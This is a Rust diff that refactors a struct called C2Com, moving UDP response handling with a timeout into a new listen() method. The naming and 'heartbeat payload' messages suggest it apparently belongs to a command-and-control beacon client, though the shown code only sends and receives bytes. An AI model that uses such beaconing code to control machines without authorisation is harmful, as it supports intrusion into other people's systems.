@@ -46,17 +46,9 @@ impl C2Com {
     pub async fn ask(&mut self, payload: &[u8]) -> Result<Option<Vec<u8>>, C2ComError> {
         self.send_bytes(payload).await?;
 
-        if let Some(sock) = &self.udp_sock {
-            println!("c2?? waiting for ask-response via udp socket.");
-            let mut response_buf = [0u8; 65535];
-            if let Some(result) = timeout(Duration::from_secs(10), sock.recv(&mut response_buf))
-                .await
-                .ok()
-            {
-                let len = result?;
-                println!("c2<< got ask-response ({len}) via udp socket.");
-                return Ok(Some(response_buf[..len].to_vec()));
-            }
+        if let Some(response) = self.listen(10).await? {
+            println!("c2<< got ask-response ({}) via udp socket.", response.len());
+            return Ok(Some(response));
         }
 
         println!("c2-- no ask-response via udp socket.");
@@ -75,6 +67,31 @@ impl C2Com {
             Err(err) => {
                 eprintln!("heartbeat payload failed. {err}");
             }
+        }
+    }
+
+    pub async fn listen(&self, timeout_secs: u16) -> Result<Option<Vec<u8>>, C2ComError> {
+        let Some(sock) = self.udp_sock.as_ref() else {
+            return Ok(None);
+        };
+
+        let mut buf = [0u8; 65535];
+
+        let len_opt = if timeout_secs == 0 {
+            sock.recv(&mut buf).await.ok()
+        } else {
+            timeout(
+                Duration::from_secs(timeout_secs as u64),
+                sock.recv(&mut buf),
+            )
+            .await
+            .ok()
+            .transpose()?
+        };
+
+        match len_opt {
+            Some(0) | None => Ok(None),
+            Some(len) => Ok(Some(buf[..len].to_vec())),
         }
     }
 }
